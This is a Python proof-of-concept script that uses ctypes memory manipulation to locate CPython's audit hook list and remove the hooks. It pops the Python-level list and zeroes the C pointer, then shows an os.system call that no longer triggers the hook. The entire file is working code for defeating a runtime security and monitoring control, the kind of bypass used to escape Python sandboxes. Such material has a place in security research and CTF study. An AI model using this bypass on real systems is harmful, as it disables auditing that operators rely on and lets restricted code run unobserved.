#!audit_hook_head_finder

### POC.py
### Find the offset to pop the audit hook
### and show to procession

from audit_hook_head_finder import print_all, get_interp_audit_hook_ptr_addr, get_runtime_audit_hook_ptr_addr, add_audit
import ctypes, sys

add_audit()
sys.addaudithook((lambda x: lambda *args: x("audit hook triggered!", args))(print))

print("--- finished setup ---")

print_all()
# must be stored in a variable
obj = ctypes.byref(ctypes.py_object(()))
ptr_tp = ctypes.POINTER(ctypes.c_uint64)
# somewhere in stack
obj_addr = ctypes.cast(obj, ptr_tp).contents.value
# we also can use the line below without creating a temporary `obj` variable
assert ctypes.POINTER(ctypes.c_voidp)(ctypes.py_object(())).contents.value == obj_addr
# offset to get audit hook pointer address (which has a "fixed" offset)
audit_hook_ptr_offset_by_py = get_interp_audit_hook_ptr_addr() - obj_addr
audit_hook_ptr_offset_by_c = get_runtime_audit_hook_ptr_addr() - obj_addr
print(f"audit_hook_ptr_offset_by_py={hex(audit_hook_ptr_offset_by_py)}\naudit_hook_ptr_offset_by_c={hex(audit_hook_ptr_offset_by_c)}")
# get audit hook as PyListObject
audit_hook_by_py: list = ctypes.cast(ctypes.cast(obj_addr + audit_hook_ptr_offset_by_py, ptr_tp).contents.value, ctypes.py_object).value
# and as C array ig
audit_hook_by_c: list = ctypes.cast(obj_addr + audit_hook_ptr_offset_by_c, ptr_tp)
print(f"len={len(audit_hook_by_py)} should be 1")

# - POC - 

ctypes._os.system("echo 'test audit hook -- this will trigger hook'")

audit_hook_by_py.pop()
ctypes.memset(audit_hook_by_c, 0, 8)

ctypes._os.system("echo 'test audit hook -- this will not'")